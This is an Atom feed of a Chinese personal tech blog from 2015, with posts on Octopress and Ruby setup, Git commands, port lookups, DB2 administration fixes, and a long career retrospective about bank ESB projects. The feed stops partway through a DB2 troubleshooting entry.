<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[haoweishow Blog]]></title>
  <link href="http://haoweishow.com/atom.xml" rel="self"/>
  <link href="http://haoweishow.com/"/>
  <updated>2015-11-15T09:05:28+08:00</updated>
  <id>http://haoweishow.com/</id>
  <author>
    <name><![CDATA[haoweishow]]></name>
    <email><![CDATA[haoweishow@gmail.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[OSX 升级导致 Octopress 异常]]></title>
    <link href="http://haoweishow.com/blog/2015/11/15/osx-sheng-ji-dao-zhi-octopress-yi-chang/"/>
    <updated>2015-11-15T08:57:31+08:00</updated>
    <id>http://haoweishow.com/blog/2015/11/15/osx-sheng-ji-dao-zhi-octopress-yi-chang</id>
    <content type="html"><![CDATA[<h2>现象</h2>

<p>octopress创建文章,本地测试,上传等命令都无法使用.</p>

<h2>解决</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ruby -v   #ruby 版本异常
</span><span class='line'>brew update
</span><span class='line'>brew install rbenv ruby-build
</span><span class='line'>rbenv install 2.2.3 #这个之后只是安装了2.2.3版本,但并未在环境变量中生效
</span><span class='line'>在.bash_profile 中增加 export PATH=/Users/haoweishow/.rbenv/versions/2.2.3/bin:$PATH
</span><span class='line'>gem install bundler
</span><span class='line'>rbenv rehash
</span><span class='line'>bundle install  #进入博客的目录执行该命令(需要 Gemfiles,在2.2.3中在重新安装一次 octopress 依赖的组件,2.0.0的 ruby 目录/Library/Ruby/Gems/2.0.0)</span></code></pre></td></tr></table></div></figure>


<h2>参考</h2>

<ul>
<li><a href="http://www.jianshu.com/p/dff042c2d10d">http://www.jianshu.com/p/dff042c2d10d</a></li>
<li><a href="http://schalkneethling.github.io/blog/2015/10/16/errno-enoent-no-such-file-or-directory-jekyll-octopress-el-capitan/">http://schalkneethling.github.io/blog/2015/10/16/errno-enoent-no-such-file-or-directory-jekyll-octopress-el-capitan/</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Git常用命令]]></title>
    <link href="http://haoweishow.com/blog/2015/08/05/Git-chang-yong-ming-ling/"/>
    <updated>2015-08-05T23:18:00+08:00</updated>
    <id>http://haoweishow.com/blog/2015/08/05/Git-chang-yong-ming-ling</id>
    <content type="html"><![CDATA[<h2>数据库维护</h2>

<ul>
<li>查看数据库的使用统计<code>git count-objects -v</code></li>
<li>数据库垃圾回收<code>git gc</code>

<h2>恢复分支</h2></li>
<li>查看最近访问的sha1数(版本号)<code>git reflog</code></li>
<li>重新创建删去的分支<code>git branch experimental SHA1_OF_HASH</code>

<h2>基本命令</h2></li>
<li>添加文件到暂存区<code>git add .</code></li>
<li>提交并添加注释<code>git commit -a -m "xx"</code></li>
<li>修改文件名称<code>git mv oldname newname</code></li>
<li>删除文件<code>git rm file</code></li>
<li>删除文件夹<code>git rm -r dir</code></li>
<li>停止跟踪文件但不删除<code>git rm --cached file</code>

<h2>合并</h2></li>
<li>把dev分支合并到当前分支<code>git merge dev</code></li>
<li><code>git rebase branch</code>

<h2>分支</h2></li>
<li>创建并切换到新分支<code>git checkout -b dev</code></li>
<li>切换分支<code>git checkout dev</code></li>
<li>以某个版本创建分支<code>git checkout -b dev commitid</code></li>
<li>在主分支的基础上创建分支<code>git checkout -b dev master</code></li>
<li>创建分支<code>git branch dev</code></li>
<li>删除分支<code>git branch -d dev</code></li>
<li>强制删除<code>git branch -D dev</code></li>
<li>查看分支<code>git branch</code></li>
<li>修改分支名称<code>git branch -m oldname newname</code>

<h2>标签</h2></li>
<li>抽取某个tag的版本<code>git archive --format=zip --output=v1.0.zip v1.0</code></li>
<li>列出所有本地tag<code>git tag</code></li>
<li>创建标签,基于已经提交的版本<code>git tag tagname</code></li>
<li>删除标签<code>git tag -d tagname</code></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[工作总结]]></title>
    <link href="http://haoweishow.com/blog/2015/06/20/gong-zuo-zong-jie/"/>
    <updated>2015-06-20T13:53:02+08:00</updated>
    <id>http://haoweishow.com/blog/2015/06/20/gong-zuo-zong-jie</id>
    <content type="html"><![CDATA[<p>工作总结
2015-06-20
终于自由了,跟以往的休假不一样了.没有工作的问题,没有工作上的电话,就算有,心态也会不同.
工作6年,学到了很多东西.</p>

<h1>西安神州数码</h1>

<p>从09年毕业,入职神码西安平台,没有经历过实习.刚入职的时候,还感觉有些后悔,因为其它实习过的同学跟公司其它人都很熟,公司的流程,项目的工作,都能侃侃而谈.而我,干瞪眼.
新入职的好像分了两批,刚进公司之后,出来领取电脑,装系统一些杂事之后,一帮人被拉到会议室开会.
会议的内容也不见简单,简单的介绍公司,介绍各个项目(公司的项目很多),下来是自我介绍.从哪开始呢,按照座位顺序来吧.好吧,我是第一个,我的介绍很简单(听了后面同学的介绍,发现自己真的说的太简单了,有点懊悔.好歹这算是个表现自己的机会啊)
后来被分到了一个组,新人4个,跟着两位老大学.感谢李敏姐,Thinks very much!学习ESB,从ESB的发展,到ESB的作用,到ESB的架构,到ESB的环境.在那台用了1个月的台式机上搭建环境.再到我们四个人写PPT,介绍自己对ESB的理解.那一个月没有留下多少印象,只记得有一次,下午下班跟同事讨论技术,讨论到很晚,没有给女朋友电话短信,后来她发飙了.
在这一个月里,真的就是年轻,用不完的经历,每天早上6点多就起床,坐车1个多小时,早早来到公司,晚上回去偶尔很晚.用不完的精力,已经不记得那个时候在公司都干了些什么.
公司每个月15号发上个月的工资,领取到上个月1周的工资700+,哇.好开心,自己第一次正式的赚钱了(以前做过临时工不算).在回去的路上给女朋友买了好多零食.
在租的房子里,笔记本电脑丢了,大学毕业前,老爸给买的,没敢告诉他老人家.报警,感受到中国警察的工作内容和态度,无语.最后又把台式机搬出来用.</p>

<h1>深圳平安银行</h1>

<p>公司安排去深圳出差,女朋友亲自送我,同去的还有个女同事,她男朋友送.到机场跟李敏姐碰面,还被笑话.
第一次坐飞机,起飞的时候,怕,脚底都冒汗了,超重到无所谓,失重的感觉,让人毫无安全感.后来好多次的出差也就习惯了.
来到大深圳,天呐,好热.之前李敏姐说深圳的雨很夸张;当你发现下雨,从你把伞拿出来到撑开,雨已经很大了.后来,有一次是真真切切的体会到了.
下飞机,去酒店,换衣服,直接去客户现场(平安大厦).这一去,就是3年8个月,我成长的第一个阵地.
项目组好多人呀,客户和同事十几二十呢.</p>

<p>项目经理金义红,人称老金,工作上很严厉,平时都很好,有一次他带我去吃深圳的卤肉饭,一个很小的店.
跟经理在一起聊的很少,没有过多的谈过工作之外的事情,但是在我成长道路上给我压力的第一个人.
印象最深刻的是一次,系统出现生产问题,需要运营同事帮忙从备份库中找出历史某天某个服务的日志.历史日志都是压缩备份的,我跟经理通过VNC(平安都使用VNC,这个在多人协查问题的时候真的很方便)连接运营的电脑,告诉他找哪天哪个文件.一连串的操作命令之后,日志文件找出来交给我们之后他就闪人了.</p>

<p>插播一下,平安高效的执行率,离不开VNC和电话会议,超级方便和高效.浦发差远了.</p>

<p>剩下的是我在那检查日志,检查了一会发现日志不够,还得查.好在之前运营告诉我们日志服务器用查询用户可以上去登录,只要记得把解压的临时文件清理掉就可以了.
然后我连上那台机器,根据记忆中的路径找到了日志文件,但是解压命令忘了.日志是gz结尾,tar命令我是刚刚看过运营的同事使用了,再轮到自己解压,中间的参数忘了是zcvf还是zxvf.在犹豫的时候,经理提醒了我,顺带说了下这些命令我都不熟悉,以后怎么解决问题(言语中带了不满,或者生气,或者鼓励,他的态度已经不重要了,重要的是我不懂这些接本的命令,而且我已进入项目组有一段时间了).这件事,过去5年多了,我一直记得.后来我也指导新同事,发现他们linux命令不熟悉,我也提醒过,态度和语气,有缓和的说明,也有严肃的教育,但是没觉得多少人后来能下功夫学习.</p>

<p>系统架构师陈宏鸿:这位可是公司的传奇人物,连续升职,最年轻的架构师,最年轻的技术总监,他的成长都是他拼搏所得.出入职能跟到这样一位大人物,真的太荣幸了.不过不是所有人都能进入架构师培养的视野.我刚进去的时候,都是做最底层的开发,渐渐的技术能力提升,做的事情也比较多,人也灵活(自我评价:思维灵活有想法).
慢慢的工作难度上去了,任务也越来越艰巨.宏鸿给我最最深刻的印象是,那时候我在处理一个数据修改的功能,总是出现数据丢失或者数据异常的问题.(具体逻辑就不表了,没多大的事,但是对刚刚开搞的我来说,晚上想问题都想的睡不着,夜里做梦都是工作上的那个问题,困扰了我好久(能困扰好久的问题,而不将问题升级,这个也是我的问题))后来宏鸿,当着我的面,写了一个完整的数据库操作工具类.我惊呆了,我那个问题也解决了(我的问题是当操作出现异常的时候,程序没有正确的回滚,导致数据状态异常).原来程序的问题是可以解决的.</p>

<p>跟女朋友异地,总是各种相思,后来同住的老同事(老雷)提醒我说可以让女朋友过来一起住,可以问问项目经理.我找老金说了情况,他同意了.(感谢老金,感谢公司的各位领导,在神码的6年里,我一直有这样的福利待遇)
女朋友来深圳,工作生活结婚生子,再到后来我在上海出差,公司也是给我很好的福利,我可以带着老婆孩子,还有我妈,一起来上海.</p>

<p>在平安的三年里,经历了ESB可能有上百次的版本投产,碰到了各种各样的问题,修复和优化了系统无数的bug和功能.工作和生活在平安都显得无比安逸和稳定.</p>

<p>但是现在想想,那个时候的想法真的很幼稚.自己虽然有空余的时间学习其它技术,但是没有经历过实战应用的技术和思想,是无法经得起考验,并且印象也不会深刻.
在平安的工作太安逸了.</p>

<p>在离开平安要来到浦发项目组的时候,我的想法并不是很清晰,但是我心底里知道,我要来这里.因此,平安的项目经理鲁健伟,最后一次邀请我挽留的时候,我还是拒绝了.我记得那顿饭,鲁总和他老婆,我和我老婆,还有我们家宝宝,一起在八卦一路的老船长旁边的餐厅吃的饭.感谢鲁总对我的认可.</p>

<p>在平安待久了,有时候都觉得东家都忘了是谁,可是毕竟无法跟银行相比.但在神码这家公司,在平安做项目,成长虽然慢,但是我走出来了.我工作的3年里,我收获了很多,得到了客户和公司的认可.
&ndash; 2015-06-20 12:00 写于上海虹桥机场(快要登机了.再见,大上海!)</p>

<p>在从深圳平安银行去上海浦发银行的过程中,还在深圳顺丰待了一个礼拜,学习新版本的ESB,顺丰用神码的ESB产品,不过是神码工程院的人在实施.
之后就来上海浦发了.</p>

<h1>上海浦发银行</h1>

<p>插播一条:从深圳到上海预订机票的时候,至考虑了价格(公司规定,折扣在7折以上的需要领导特批),买的机票居然是要在景德镇中转,刚好那天晚上上海暴雨,好多航班都未在上海落地.在景德镇待了一晚,第二天上午才到上海.</p>

<p>正式开启新的工作.
满心期待的可以一展身手,可以好好的写代码.结果按照项目实施,或者软件开发的流程,先是文档的编写,各种需求文档,概要设计,详细设计(虽然是公司现成的产品,但是文档多多少少有问题,要么缺少,要么不符合行内的规范),总之花了好多个人月来写文档.</p>

<p>这里必须提一下,在这个过程中,我写文档的能力又被鄙视了(不对,是我自己深深的意识到自己的这方面的能力是有多差劲).由于产品是工程院出品,客户有些特别的需求,跟我们提及之后,我们需要整理成需求文档,发给工程院的同事,让他们实现.
我写的需求文档(记得好像就3,4个需求吧),拿给宏鸿看,结果他无语的表情深深的刺激了我.我了解他,我的东西如果只是一般的差,他会当面批评教育,但是这时,肯定是我的东西差到无话可说的地步.
又发现了自己的薄弱.这个薄弱点是在之前的工作中不曾遇到多的,工作中也很少涉及文档,或者正式文档的编写.</p>

<p>既然有弱项,那么就改进喽.边改进,边反思.这方面的经验,简直是对自己几年ESB实施经历的否认,做了这么多年ESB的是实施,来到这里,感觉跟没做过一样.</p>

<p>坚持不懈,我挺过来了,挺过了那段自我怀疑的阶段.文档编写的能力在之后的两年里慢慢的一点点提升,虽然达不到很厉害的水平,但总归有所提升,有所收获.</p>

<p>2013年6月初来到上海浦发银行,到2013年12月份,系统上线.这半年时间里,几乎每天加班,项目组的同事和领导都很有干劲,工作是那么有激情.浦发项目成功上线,我作为项目架构师(在这里担任架构师的职责,宏鸿负责督战),也满心期望的能成为真正的架构师.
在公司的架构师评审中,我的表现很差,当初没有认真对待,没有认真准备自己的材料.通过电话会议的评审,没有通过各位委员的认可.
总结几点:
1. 评审问了我ESB产品的缺点?我当时脑袋空白,不知道该怎么回答,就说了ESB产品模块化程度不够&hellip;bilibili说了一些.
2. 我有没有从头到尾做过一个产品的架构?有还是没有?我脑子闪过我所做的事情,除了ESB产品的实施,而且做实施类项目,怎么可能有机会从头到尾进行产品的架构设计呢?而那些之前做过的小产品我也没觉得架构有多NB,因此我坚定的回答了没有.
过了好久之后,宏鸿总告诉我结果,当然是没有通过了.告诉我失败的原因,上面两点还有其它的一些.
当时还没怎么想,没怎么考虑,当天就糊里糊涂的过去了.</p>

<p>在后来的工作过程中,我的工作热情慢慢的降下来了,由原来的200%慢慢回归到正常的工作状态.
怀疑过公司,怀疑过我的努力,怀疑过自己的能力&hellip;.
期间看过淘宝的一篇文章,作者是在非常努力,各种表现都很好的情况下,毫无理由的被否定,后来领导告诉他说这是对他的考验,如果连这点压力都扛不住,那他真的不适合这个职位.</p>

<p>我也这么想过,我也试着平复自己的心情,平复自己内心的无奈.
时间是最好的药.
很庆幸自己那时候没有太冲动(当然很大一部分原因在于家庭,我拖家带口的,怎么可能说走就走呢).
自己之所以没有成为架构师,原因还是在自己.
&ndash; 2015-06-20 13:00 写于上海虹桥机场(飞机登机时间延迟到13:00)</p>

<p>自己确实如他所说,没有从头开始进行一个产品架构的设计,那些小的系统,在我眼里真的不值一提.
后来公司组织的一次架构培训,他也提到过,要成为架构师,必须经历两个阶段,一个失败的架构设计,和一个成功的架构设计.
个人理解:经历过失败,你才明白,产品或者功能要怎么设计才能解决问题,避免踩坑.其实在现在这种类型的实施项目中,我也经历的可能更多的是产品细节实现上一些有问题的设计.</p>

<p>不过这些要作为成为架构师的资本来说,远远不够,真的就要像他说的一样,必须从头开始设计产品的架构,才有资格成为架构师.</p>

<p>因此我的思想,慢慢的从抱怨(做实施类的项目怎么可能有机会从头开始呢),到慢慢的接受,再到现在发现自己不成功的原因.</p>

<p>关于我不能成为架构师,我的理解:
公司角度:我做的过项目太少,经历的少,经验方面肯定会有局限性,经验这东西真的需要踩坑,需要实际接触到,才能变成自己的;而我自己因为家庭,同时公司也需要一些稳定的人来支撑项目的实施,因此我也不用到处跑,待在一个项目里好好干即可.</p>

<p>个人角度:我做过的东西确实少,写过的技术博客也很单薄,到目前为止也都是一些工作总结性质的,技术方面的深度还是不够.因此,就算公司给我个架构师,我也觉得自己不合格.</p>

<p>既然找到原因:
那么结论就显而易见了,我选择了离开神码,几点原因:
1. 出差,长期的出差,很少有归属感,也不好照顾父母;
2. 家庭,孩子的教育问题,在上海或者其它地方,肯定无法给孩子安稳的教育环境;
3. 环境,是指工作周围的同事,这里绝无贬义,但却是个不争的事实,我希望自己能够与优秀的人共事;
4. 工资,这个行业现状,跳槽永远比升职工资涨的快;
这个思想的转变也是慢慢形成的,包括对自己当前环境,工作状态的审视,更早的时候,都没有考虑过这些问题.当被严重打击之后,才意识到要好好考虑考虑,好好想想.</p>

<p>推荐一篇文章,二爷写的:人生苦短,度日如年.
这么短暂的人生,哪有时间浪费呢?因此,我要找更优秀的公司,更优秀的团队,更优秀的同事一起共事,提升自己的能力.
而且你周围人的平均水平就是你的水平,因此,如何选择就很容易了.</p>

<p>再提一句,我喜欢与聪明的人共事.
培养那些上进心不足的人,简直是浪费时间.(请见谅这句话如此的过分,但如果你觉这句话让你不舒服,那么你有可能就是那种人)</p>

<p>&ndash; 2015-06-20 写于虹桥机场MU2156(已经登机,等待起飞,晚点多久,不得而知)</p>

<h1>西安华为</h1>

<p>2015-07-17将会加入华为云计算部门,后面的境况如何,现在无法预测.
工作6年,明白的道理:
<strong>如果当前的环境无法再让你有所提升,那么你就必须考虑换一个,人生苦短,考虑好就不要再犹豫!</strong></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[端口占用查询]]></title>
    <link href="http://haoweishow.com/blog/2015/05/28/duan-kou-zhan-yong-cha-xun/"/>
    <updated>2015-05-28T17:04:46+08:00</updated>
    <id>http://haoweishow.com/blog/2015/05/28/duan-kou-zhan-yong-cha-xun</id>
    <content type="html"><![CDATA[<p> <strong>(根据端口号,查找对应的进程)</strong></p>

<h2>Win系统</h2>

<ul>
<li>查找pid: <code>C:\&gt;netstat -aon|findstr "1088"</code></li>
<li>查找进程名称: <code>C:\&gt;tasklist|findstr "&lt;pid&gt;"</code></li>
</ul>


<h2>Linux系统</h2>

<ul>
<li>方法1: <code>lsof -i :8388</code></li>
<li>方法2: <code>netstat -ntlp</code></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Active Internet connections (only servers)
</span><span class='line'>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
</span><span class='line'>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      868/sshd
</span><span class='line'>tcp6       0      0 :::22                   :::*                    LISTEN      868/sshd</span></code></pre></td></tr></table></div></figure>


<h2>Aix系统</h2>

<ul>
<li>step1: <code>netstat -Aan|grep 6200|grep LISTEN</code></li>
<li>step2: <code>rmsock f1000e0000307bb0 tcpcb</code></li>
<li>step3: <code>ps -ef|grep &lt;pid&gt;</code></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Db2数据导入导出效率对比]]></title>
    <link href="http://haoweishow.com/blog/2015/05/14/db2shu-ju-dao-ru-dao-chu-xiao-lu-dui-bi/"/>
    <updated>2015-05-14T13:52:50+08:00</updated>
    <id>http://haoweishow.com/blog/2015/05/14/db2shu-ju-dao-ru-dao-chu-xiao-lu-dui-bi</id>
    <content type="html"><![CDATA[<h2>背景</h2>

<ul>
<li>生产环境的流水数据,在日终批量的时候,需要把前一天的流水数据迁移至历史库.</li>
<li>每天两千万条流水,整个批量耗时1~2个小时.</li>
<li>当前交易量还只是未来计划的1/4,如果达到预期的交易量,那么批量程序的耗时这么下去就太离谱了.</li>
<li>批量程序只记录开始和结束时间,未统计或者日志中输出每个主要过程的耗时,因此只能在测试环境尝试发现耗时点和优化方法.</li>
<li>有些地方更新线上版本实在太困难(没有大的问题,能跑就坚决不动)</li>
</ul>


<h2>处理过程</h2>

<ul>
<li>当前库.流水表->卸载分区->生成临时表->导出数据</li>
<li>后线库.流水表->导入数据->生成临时表->加载分区->数据完整性校验</li>
<li>当前库.流水表->删除临时表</li>
</ul>


<h2>耗时分析</h2>

<h3>数据导出</h3>

<ul>
<li>这里的导出是指<strong>[生成临时表->导出数据]</strong>这一步</li>
<li>优化前</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>db2 "export to 文件名.ixf of ixf select * from 临时表名"</span></code></pre></td></tr></table></div></figure>


<ul>
<li>优化后</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>db2 "export to 文件名.ixf of del modified by coldel0x01 select * from 临时表名"</span></code></pre></td></tr></table></div></figure>


<ul>
<li>两种方式导出的数据文件,数据的分隔符不同(再深入的差别不晓得)</li>
<li>在测试环境,针对优化前后进行了测试</li>
</ul>


<table>
<thead>
<tr>
<th>  项目 </th>
<th>  数据量  </th>
<th style="text-align:right;">  导出耗时  </th>
<th style="text-align:right;">  导出文件  </th>
</tr>
</thead>
<tbody>
<tr>
<td>优化前 </td>
<td> 1000万 </td>
<td style="text-align:right;"> 10分钟 </td>
<td style="text-align:right;"> 8G </td>
</tr>
<tr>
<td>优化后 </td>
<td> 1000万 </td>
<td style="text-align:right;"> 2分钟 </td>
<td style="text-align:right;"> 4G  </td>
</tr>
</tbody>
</table>


<h3>数据导入</h3>

<ul>
<li>导入是指<strong>[导入数据->生成临时表]</strong>这一步</li>
<li>优化前</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>db2 "import from 文件名.ixf of ixf commitcount 500 create into 临时表名 in 表空间"</span></code></pre></td></tr></table></div></figure>


<ul>
<li>优化后</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>db2 "create table 临时表名 like 表名 in 表空间"
</span><span class='line'>db2 "load from 文件名.ixf of ixf insert into 临时表名 nonrecoverable"</span></code></pre></td></tr></table></div></figure>


<ul>
<li>在测试环境,针对优化前后进行了测试,该导入测试,依赖的导出数据为<strong>优化前的导出格式(默认的分隔符)</strong></li>
</ul>


<table>
<thead>
<tr>
<th>  项目 </th>
<th>  数据量  </th>
<th style="text-align:right;">  导入耗时  </th>
</tr>
</thead>
<tbody>
<tr>
<td>优化前 </td>
<td> 1000万 </td>
<td style="text-align:right;"> too lang</td>
</tr>
<tr>
<td>优化后 </td>
<td> 1000万 </td>
<td style="text-align:right;"> 2分钟 </td>
</tr>
</tbody>
</table>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Db2stop Force 失败]]></title>
    <link href="http://haoweishow.com/blog/2015/05/13/db2stop-force-shi-bai/"/>
    <updated>2015-05-13T09:53:07+08:00</updated>
    <id>http://haoweishow.com/blog/2015/05/13/db2stop-force-shi-bai</id>
    <content type="html"><![CDATA[<h2>背景</h2>

<p>系统使用DB2数据库,日常操作没有遇到问题.
但是最近出现两次操作错误,引起一些问题,有必要记录一下.</p>

<h2>现象1</h2>

<ul>
<li>执行<code>db2move esbdb load</code>的时候,数据库名称写错,直接Ctrl+C终止,但是shell并未终止.</li>
<li>再次执行<code>db2stop force</code>,仍然未停止,CPU占用在0~50%之间</li>
<li>尝试发现DB2在做什么?无果,db2diag的日志在不停的刷</li>
<li>经过一些毁灭性的操作之后,请来db2专家搞定(过程不表,反正是一身冷汗)</li>
</ul>


<h2>现象2</h2>

<ul>
<li>手动执行存储过程,由于未指定时间,导致SQL执行长时间未停止</li>
<li>强制停止该存储过程,也是没有停掉</li>
<li>执行<code>db2stop force</code>仍然未停止数据库</li>
<li>有了第一次的经历,不敢再进行更进一步的动作,希望DB2能够自己处理完之后能够停下来</li>
<li>等到第二天(大约过了15个小时),依然CPU很高,没有停止的迹象</li>
</ul>


<h2>解决</h2>

<p>这个解决是在<strong>现象2</strong>之后执行的.
* <code>ps -ef|grep db2stop</code>
* <code>kill &lt;pid&gt;</code> #kill掉'db2stop force'对应的进程
* 再次执行<code>ps -ef|grep db2stop</code>,没有对应的信息,数据已经停止
* 重启数据库<code>db2start</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DB2数据库同步]]></title>
    <link href="http://haoweishow.com/blog/2015/04/08/db2shu-ju-ku-tong-bu/"/>
    <updated>2015-04-08T14:03:52+08:00</updated>
    <id>http://haoweishow.com/blog/2015/04/08/db2shu-ju-ku-tong-bu</id>
    <content type="html"><![CDATA[<h1>背景</h1>

<ul>
<li>在进行第二轮UAT测试的时候,需要进行版本重新部署,该部署过程要与上线一致(即验证投产的程序和SQL版本的正确性,验证部署说明的可操作性),因此需要将该UAT环境与准生产环境初始化成一致的状态.</li>
<li>应用程序直接拷贝过来即可.</li>
<li>数据库需要进行同步,来保证UAT环境的数据库和准生产环境的数据库一致.</li>
</ul>


<h1>前提</h1>

<ul>
<li>数据库: DB2 V9.7</li>
<li>准生产环境: 简称PRD</li>
<li>准生产数据库名称: prddb</li>
<li>UAT环境: 简称UAT</li>
<li>UAT数据库名称名称: uatdb</li>
<li>数据库实例用户: db2inst</li>
<li>数据库应用用户: db2app</li>
<li>注:两个环境的数据库表结构/表空间等信息一致</li>
<li>注:导入导出涉及两个用户,下述步骤忽略用户操作的目录和权限相关内容,在实际操作中请自行处理</li>
<li>注:此方法可以保证导入后的数据库,表的索引/约束等信息仍然保留</li>
</ul>


<h1>导出</h1>

<h2>导出DDL</h2>

<ul>
<li>db2app用户登录PRD环境</li>
<li>连接数据库: <code>db2 connect to prddb</code></li>
<li>导出DDL: <code>db2look -d prddb -e -o ddl.sql</code></li>
<li>关闭连接: <code>db2 connect reset</code></li>
<li>注:上述命令会导出db2app用户相关的所有表/视图/存储过程等</li>
</ul>


<h2>导出数据</h2>

<ul>
<li>db2inst用户登录PRD环境</li>
<li>创建目录: <code>mkdir prddb.ixf;cd prddb.ixf</code></li>
<li>导出ixf: <code>db2move prddb export</code></li>
</ul>


<h1>数据迁移</h1>

<ul>
<li>将db2db.sql文件从PRD环境传输到UAT环境</li>
<li>将prddb.ixf文件夹从PRD环境传输到UAT环境</li>
</ul>


<h1>导入</h1>

<h2>创建表</h2>

<ul>
<li>db2app用户登录UAT环境</li>
<li>删除uatdb库中的全部表/视图/存储过程等,该步骤需要手动执行</li>
<li>修改db2db.sql文件中的数据库名称为uatdb</li>
<li>连接数据库: <code>db2 connect to uatdb</code></li>
<li>执行命令<code>db2 -tvf db2db.sql</code>重新创建表/视图/存储过程等</li>
<li>关闭连接: <code>db2 connect reset</code></li>
</ul>


<h2>导入数据</h2>

<ul>
<li>db2inst用户登录UAT环境</li>
<li>进入文件夹: <code>cd prddb.ixf</code></li>
<li>方法1

<ul>
<li>导入ixf:<code>db2move uatdb load</code></li>
<li>修改表状态:<code>db2 set integrity [表名] immediate checked</code></li>
</ul>
</li>
<li>方法2

<ul>
<li>导入ixf:<code>db2move uatdb import</code></li>
<li>有主外键依赖的关系,表数据会导入失败</li>
</ul>
</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[浦发ESB性能测试优化方案]]></title>
    <link href="http://haoweishow.com/blog/2015/03/13/pu-fa-esbxing-neng-ce-shi-you-hua-fang-an/"/>
    <updated>2015-03-13T11:25:29+08:00</updated>
    <id>http://haoweishow.com/blog/2015/03/13/pu-fa-esbxing-neng-ce-shi-you-hua-fang-an</id>
    <content type="html"><![CDATA[
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DB2数据库日志空间满]]></title>
    <link href="http://haoweishow.com/blog/2015/03/13/db2shu-ju-ku-ri-zhi-kong-jian-man/"/>
    <updated>2015-03-13T11:14:36+08:00</updated>
    <id>http://haoweishow.com/blog/2015/03/13/db2shu-ju-ku-ri-zhi-kong-jian-man</id>
    <content type="html"><![CDATA[<p>DB2数据库日志空间满</p>

<h2>错误:</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>SQL0964C The transaction log for the database is full. SQLSTATE=57011</span></code></pre></td></tr></table></div></figure>


<h2>检查数据库日志配置</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>db2 connect to esbdbfe user esbinst using esbinst 
</span><span class='line'>db2 get db cfg for esbdbfe show detail |grep -i log
</span><span class='line'>Log buffer size(4KB)  (LOGBUFSZ) = 8192      8192
</span><span class='line'>Log file size(4KB)   (LOGFILSIZ) = 655       655   #单个日志文件size太小</span></code></pre></td></tr></table></div></figure>


<h2>更新数据库日志配置</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>db2 connect to esbdbfe user esbinst using esbinst
</span><span class='line'>db2 update db cfg using LOGFILSIZ 10240  
</span><span class='line'>db2stop force 
</span><span class='line'>db2start</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DB2 表状态异常SQL20054N]]></title>
    <link href="http://haoweishow.com/blog/2015/03/13/db2-biao-zhuang-tai-yi-chang-sql20054n/"/>
    <updated>2015-03-13T10:48:49+08:00</updated>
    <id>http://haoweishow.com/blog/2015/03/13/db2-biao-zhuang-tai-yi-chang-sql20054n</id>
    <content type="html"><![CDATA[<p>DB2 表状态异常SQL20054N</p>

<h2>背景</h2>

<p>测试环境的一张表在前线库和后线库中进行了分区处理. 前线库存放当天和未来的分区, 后线库存放昨天和过去N天的数据.
该表的消息ID字段是主键.</p>

<h2>现象</h2>

<p>在日终批量的时候,从前线库卸载下来的分区数据,可以导入后线库,但是该表的状态异常,不能删除更早的历史分区(手动执行也报错)
DB2错误码: SQL20054N reeasoncode:29</p>

<h2>原因</h2>

<p>消息ID出现重复,前线库中有一条记录与后线库的历史分区里某一天的数据重复.因为消息ID可以保证在前线库唯一,但是无法保证两个库唯一.<br/>
出现异常的流程:<br/>
* 前线库:分区卸载<br/>
* 前线库:数据导出ixf文件<br/>
* 后线库:关闭约束检查<code>db2 "set integrity for tabname check immediate unchecked"</code><br/>
* 后线库:从ixf文件中import数据(正常)<br/>
* 后线库:开启约束检查<code>db2 "set integrity for tabname immediate checked"</code>(异常,该语句报错,导致后面删除分区也未能执行)</p>

<h2>解决</h2>

<h3>临时解决</h3>

<ul>
<li>删除后线库该表的数据(也可以只删除重复的数据)</li>
